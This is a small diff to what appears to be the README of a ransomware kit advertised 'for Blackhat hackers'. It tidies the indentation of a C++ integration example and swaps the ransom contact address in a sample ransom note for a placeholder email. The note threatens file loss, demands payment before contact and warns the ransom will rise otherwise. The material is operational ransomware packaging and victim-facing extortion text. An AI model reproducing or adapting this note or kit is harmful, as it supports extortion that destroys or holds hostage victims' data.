@@ -5,7 +5,7 @@ An advanced customizable ransomware solution for Blackhat hackers.
 
 Example integration
 ```cpp
-    #include <iostream>
+#include <iostream>
 #include <vector>
 #include <string>
 #include <chrono>
@@ -66,7 +66,7 @@ DO NOT MODIFY THIS OR ALL YOUR FILES WILL BE LOST (It is the RSA encrypted key f
 
 GJXy2U6fJlThFBb9a1WwQFGfNzAlkpAmYTyrd+zddNJyxwhJrrwTStvtOM40OMtvLNiGWhIFAU7kFrQnmxzuntFse1+hzqmxz3xgUI+l5KiVgXiNvaLDmvGdvjCGg0ADjQcD/mkCW0FIIdtXXjNr+2seACPCFjYEajryMuPXekE=
 
-Send this whole file to this email address AFTER you have paid the ransom: tech@anon.gov
+Send this whole file to this email address AFTER you have paid the ransom: your-email@dnmx.org
 
 If you contact this email before the ransom is paid in full it will likely be increased.
 
